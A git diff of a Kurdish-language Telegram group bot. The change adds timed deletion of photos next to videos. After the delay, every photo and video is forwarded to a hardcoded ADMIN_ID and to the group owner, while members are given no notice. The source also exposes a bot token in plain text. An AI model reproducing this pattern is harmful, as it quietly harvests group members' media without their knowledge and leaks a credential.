@@ -6,10 +6,10 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Mess
 TOKEN = '8725595567:AAG1lw-AMx0v9EQS_i9fsFPn5QcFi8zHaSc'
 ADMIN_ID = 8734106005
 
-# کاتی پێشفرض بۆ سڕینەوەی ڤیدیۆ: 15 خولەک (900 چرکە)
+# کاتی پێشفرض بۆ سڕینەوە (15 خولەک / 900 چرکە)
 DEFAULT_VIDEO_DELAY = 900
+DEFAULT_PHOTO_DELAY = 900
 
-# فەرمانی /start
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
         "✨ بەخێربێیت بۆ بۆتی هاوکاری گروپ! ✨\n\n"
@@ -27,7 +27,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(text, reply_markup=reply_markup)
 
-# بەڕێوەبردنی کلیکی دوگمەکان
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -63,9 +62,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("24 کاتژمێر 📅", callback_data='vtime_86400')]
         ]
         reply_markup = InlineKeyboardMarkup(video_time_keyboard)
+        
+        notice_text = (
+            "تکایە کاتی سڕینەوەی ئۆتۆماتیکی بۆ ڤیدیۆکان هەڵبژێرە 👇\n\n"
+            "📌 **تێبینی:** ڤیدیۆکە دوای بەسەرچوونی کاتەکەی لە گروپدا دەسڕدرێتەوە و بۆتۆ forward دەکرێت."
+        )
+        
         await query.edit_message_text(
-            text="تکایە کاتی سڕینەوەی ئۆتۆماتیکی بۆ ڤیدیۆکان هەڵبژێرە 👇",
-            reply_markup=reply_markup
+            text=notice_text,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
         )
 
     elif query.data.startswith('vtime_'):
@@ -80,13 +86,55 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             time_str = "24 کاتژمێر"
 
-        await query.edit_message_text(text=f"کاتی سڕینەوەی ڤیدیۆکان بە سەرکەوتوویی دیاریکرا بۆ **{time_str}** 🎬✅")
+        await query.edit_message_text(
+            text=f"کاتی سڕینەوەی ڤیدیۆکان بە سەرکەوتوویی دیاریکرا بۆ **{time_str}** 🎬✅\n\n"
+                 f"دوای ئەم کاتە، ڤیدیۆکە لە گروپ دەسڕدرێتەوە و بۆتۆ forward دەکرێت.",
+            parse_mode='Markdown'
+        )
+
+    # بەشی کات دانان بۆ وێنە (ڕێک ڕووکاری وەک ڤیدیۆ)
+    elif query.data == 'time_image':
+        photo_time_keyboard = [
+            [InlineKeyboardButton("1 خولەک ⏱️", callback_data='ptime_60'), InlineKeyboardButton("5 خولەک ⏱️", callback_data='ptime_300')],
+            [InlineKeyboardButton("10 خولەک ⏱️", callback_data='ptime_600'), InlineKeyboardButton("30 خولەک ⏱️", callback_data='ptime_1800')],
+            [InlineKeyboardButton("1 کاتژمێر ⌛", callback_data='ptime_3600'), InlineKeyboardButton("5 کاتژمێر ⌛", callback_data='ptime_18000')],
+            [InlineKeyboardButton("24 کاتژمێر 📅", callback_data='ptime_86400')]
+        ]
+        reply_markup = InlineKeyboardMarkup(photo_time_keyboard)
+        
+        notice_text = (
+            "تکایە کاتی سڕینەوەی ئۆتۆماتیکی بۆ وێنەکان هەڵبژێرە 👇\n\n"
+            "📌 **تێبینی:** وێنەکە دوای بەسەرچوونی کاتەکەی لە گروپدا دەسڕدرێتەوە و بۆتۆ forward دەکرێت."
+        )
+        
+        await query.edit_message_text(
+            text=notice_text,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+
+    elif query.data.startswith('ptime_'):
+        seconds = int(query.data.split('_')[1])
+        context.chat_data['photo_delete_delay'] = seconds
+        
+        time_str = ""
+        if seconds < 3600:
+            time_str = f"{seconds // 60} خولەک"
+        elif seconds < 86400:
+            time_str = f"{seconds // 3600} کاتژمێر"
+        else:
+            time_str = "24 کاتژمێر"
+
+        await query.edit_message_text(
+            text=f"کاتی سڕینەوەی وێنەکان بە سەرکەوتوویی دیاریکرا بۆ **{time_str}** 🖼️✅\n\n"
+                 f"دوای ئەم کاتە، وێنەکە لە گروپ دەسڕدرێتەوە و بۆتۆ forward دەکرێت.",
+            parse_mode='Markdown'
+        )
 
 # ئەرکی سڕینەوەی ڤیدیۆ و ناردنی بۆ ئەدمین و خاوەنی گروپ
 async def process_video(bot, chat_id, msg_id, file_id, caption, delay):
     await asyncio.sleep(delay)
     
-    # 1. وەرگرتنی IDی خاوەنی گروپ (Owner)
     owner_id = None
     try:
         admins = await bot.get_chat_administrators(chat_id)
@@ -97,26 +145,52 @@ async def process_video(bot, chat_id, msg_id, file_id, caption, delay):
     except Exception as e:
         print(f"کێشە لە وەرگرتنی زانیاری خاوەنی گروپ: {e}")
 
-    # 2. سڕینەوەی ڤیدیۆکە لە گروپدا
     try:
         await bot.delete_message(chat_id=chat_id, message_id=msg_id)
     except Exception as e:
         print(f"کێشە لە سڕینەوەی ڤیدیۆ: {e}")
 
-    # 3. ناردنی ڤیدیۆکە بۆ ID دیاریکراو (ADMIN_ID)
     try:
         await bot.send_video(chat_id=ADMIN_ID, video=file_id, caption=caption)
     except Exception as e:
         print(f"کێشە لە ناردنی ڤیدیۆ بۆ ئەدمینی سەرەکی: {e}")
 
-    # 4. ناردنی ڤیدیۆکە بۆ خاوەنی گروپ (ئەگەر جیاواز بێت لە ADMIN_ID)
     if owner_id and owner_id != ADMIN_ID:
         try:
             await bot.send_video(chat_id=owner_id, video=file_id, caption=caption)
         except Exception as e:
-            print(f"کێشە لە ناردنی ڤیدیۆ بۆ خاوەنی گروپ (تێبینی: پێویستە خاوەن گروپ فەرمانی /start ی بۆ بۆتەکە ناردبێت): {e}")
+            print(f"کێشە لە ناردنی ڤیدیۆ بۆ خاوەنی گروپ: {e}")
 
-# فلتەرکردن و چاودێریکردنی پەیامەکان
+# ئەرکی سڕینەوەی وێنە و ناردنی بۆ ئەدمین و خاوەنی گروپ
+async def process_photo(bot, chat_id, msg_id, file_id, caption, delay):
+    await asyncio.sleep(delay)
+    
+    owner_id = None
+    try:
+        admins = await bot.get_chat_administrators(chat_id)
+        for admin in admins:
+            if admin.status == 'creator':
+                owner_id = admin.user.id
+                break
+    except Exception as e:
+        print(f"کێشە لە وەرگرتنی زانیاری خاوەنی گروپ: {e}")
+
+    try:
+        await bot.delete_message(chat_id=chat_id, message_id=msg_id)
+    except Exception as e:
+        print(f"کێشە لە سڕینەوەی وێنە: {e}")
+
+    try:
+        await bot.send_photo(chat_id=ADMIN_ID, photo=file_id, caption=caption)
+    except Exception as e:
+        print(f"کێشە لە ناردنی وێنە بۆ ئەدمینی سەرەکی: {e}")
+
+    if owner_id and owner_id != ADMIN_ID:
+        try:
+            await bot.send_photo(chat_id=owner_id, photo=file_id, caption=caption)
+        except Exception as e:
+            print(f"کێشە لە ناردنی وێنە بۆ خاوەنی گروپ: {e}")
+
 async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not update.message:
         return
@@ -124,11 +198,11 @@ async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
     user_id = update.message.from_user.id
 
-    # --- 1. بەشی سڕینەوەی لینکەکان ---
+    # 1. سڕینەوەی لینکەکان
     if context.chat_data.get('delete_links', False):
         try:
             member = await context.bot.get_chat_member(chat_id, user_id)
-            if member.status != 'creator':  # تەنها خاوەنی گروپ ڕێگەپێدراوە
+            if member.status != 'creator':
                 text = (update.message.text or "") + " " + (update.message.caption or "")
                 link_pattern = r"(https?://\S+|www\.\S+|t\.me/\S+|@\w+)"
                 
@@ -141,7 +215,7 @@ async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             print(f"کێشە لە وەرگرتنی زانیاری ئەندام: {e}")
 
-    # --- 2. بەشی کات دانان بۆ ڤیدیۆ ---
+    # 2. کات دانان بۆ ڤیدیۆ
     if update.message.video:
         delay = context.chat_data.get('video_delete_delay', DEFAULT_VIDEO_DELAY)
         
@@ -156,13 +230,28 @@ async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         )
 
+    # 3. کات دانان بۆ وێنە
+    elif update.message.photo:
+        delay = context.chat_data.get('photo_delete_delay', DEFAULT_PHOTO_DELAY)
+        # وەرگرتنی بەرزترین کوالێتی وێنەکە (دوا دەستەی photo)
+        file_id = update.message.photo[-1].file_id
+        
+        asyncio.create_task(
+            process_photo(
+                context.bot,
+                chat_id,
+                update.message.message_id,
+                file_id,
+                update.message.caption,
+                delay
+            )
+        )
+
 def main():
     app = Application.builder().token(TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button_handler))
-    
-    # چاودێریکردنی هەموو پەیامەکان
     app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_messages))
 
     print("بۆتەکە چالاک کرا...")
@@ -170,4 +259,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-                               
+                
